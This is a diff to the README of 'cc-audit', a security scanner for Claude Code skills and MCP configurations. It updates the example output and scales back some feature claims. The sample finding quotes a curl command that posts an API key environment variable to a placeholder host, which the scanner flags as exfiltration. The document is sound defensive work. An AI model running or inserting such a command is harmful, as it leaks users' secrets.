@@ -107,17 +107,23 @@ cc-audit --init ./
 ## Example Output
 
 ```
-cc-audit v3.0.0 - Claude Code Security Auditor
-
 Scanning: ./awesome-skill/
 
-[ERROR] EX-001: Network request with environment variable
-  Location: scripts/setup.sh:42
-  Code: curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"
+scripts/setup.sh:42:1: [ERROR] [CRITICAL] EX-001: Network request with environment variable
+     |
+  42 | curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"
+     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+     = why: Potential data exfiltration: network request with environment variable detected
+     = ref: CWE-200, CWE-319
+     = fix: Remove or encrypt sensitive data before transmission
 
-[ERROR] OP-001: Wildcard tool permission
-  Location: SKILL.md (frontmatter)
-  Issue: allowed-tools: *
+SKILL.md:3:1: [ERROR] [HIGH] OP-001: Wildcard tool permission
+     |
+   3 | allowed-tools: *
+     | ^^^^^^^^^^^^^^^^
+     = why: Overly permissive tool access detected
+     = ref: CWE-250
+     = fix: Specify explicit tool permissions instead of wildcard
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Risk Score: 60/100 [██████░░░░] HIGH
@@ -138,7 +144,7 @@ Result: FAIL (exit code 1)
 
 ## Key Features
 
-- **210+ Detection Rules** — Exfiltration, privilege escalation, persistence, prompt injection, and more
+- **100+ Detection Rules** — Exfiltration, privilege escalation, persistence, prompt injection, and more
 - **Multiple Scan Types** — Skills, hooks, MCP servers, commands, Docker, dependencies, subagents, plugins
 - **Multi-Client Support** — Auto-detect and scan Claude, Cursor, Windsurf, VS Code configurations
 - **Remote Repository Scanning** — Scan GitHub repositories directly, including awesome-claude-code ecosystem
@@ -149,7 +155,7 @@ Result: FAIL (exit code 1)
 - **Auto-Fix** — Automatically fix certain issues
 - **Multiple Output Formats** — Terminal, JSON, SARIF, HTML, Markdown
 - **Security Badges** — Generate shields.io badges for your projects
-- **SBOM Generation** — CycloneDX and SPDX format support
+- **SBOM Generation** — CycloneDX format support
 - **Proxy Mode** — Runtime MCP monitoring with transparent proxy
 - **Watch Mode** — Real-time scanning during development
 - **CI/CD Ready** — SARIF output for GitHub Security integration
